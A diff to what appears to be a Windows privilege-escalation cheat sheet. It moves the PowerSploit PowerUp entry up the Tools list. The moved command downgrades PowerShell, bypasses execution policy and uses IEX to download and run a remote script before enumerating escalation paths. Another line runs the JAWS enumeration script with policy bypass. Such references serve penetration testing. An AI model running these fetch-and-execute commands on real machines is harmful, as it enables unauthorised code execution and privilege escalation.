@@ -23,6 +23,10 @@
 
 ## Tools
 
+- [PowerSploit's PowerUp](https://github.com/PowerShellMafia/PowerSploit)
+    ```powershell
+    powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
+    ```
 - [Watson - Watson is a (.NET 2.0 compliant) C# implementation of Sherlock](https://github.com/rasta-mouse/Watson)
 - [(Deprecated) Sherlock - PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities](https://github.com/rasta-mouse/Sherlock)
     ```powershell
@@ -42,10 +46,6 @@
 - [JAWS - Just Another Windows (Enum) Script](https://github.com/411Hall/JAWS)
     ```powershell
     powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
-    ```
-- [PowerSploit's PowerUp](https://github.com/PowerShellMafia/PowerSploit)
-    ```powershell
-    powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
     ```
 
 ## Windows Version and Configuration
